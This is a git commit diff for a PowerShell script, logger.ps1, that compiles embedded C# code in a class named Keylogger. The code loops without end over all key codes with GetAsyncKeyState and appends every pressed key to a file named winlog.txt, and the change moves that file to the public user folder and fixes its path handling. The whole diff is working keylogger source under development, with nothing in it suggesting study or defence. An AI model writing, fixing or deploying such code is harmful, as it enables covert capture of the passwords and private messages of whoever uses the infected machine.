3cbfa714c1440941c097893c324506e4089e9dda
Meneervera <info@davevera.nl>
2025-02-03 20:59:07 +0100

    Update logger.ps1

--- logger.ps1
+++ logger.ps1
@@ -1,4 +1,5 @@
-$logPath = "$env:APPDATA\winlog.txt"
+$logPath = "C:\\Users\\Public\\winlog.txt"  # Gebruik dubbele backslashes
+
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
@@ -7,10 +8,11 @@ public class Keylogger {
     [DllImport("user32.dll")]
     public static extern int GetAsyncKeyState(int vKey);
     public static void Main() {
+        string filePath = "C:\\Users\\Public\\winlog.txt";  // Dubbele backslashes!
         while (true) {
             for (int i = 0; i < 255; i++) {
                 if (GetAsyncKeyState(i) != 0) {
-                    File.AppendAllText("$logPath", ((ConsoleKey)i).ToString());
+                    File.AppendAllText(filePath, ((ConsoleKey)i).ToString());
                 }
             }
         }
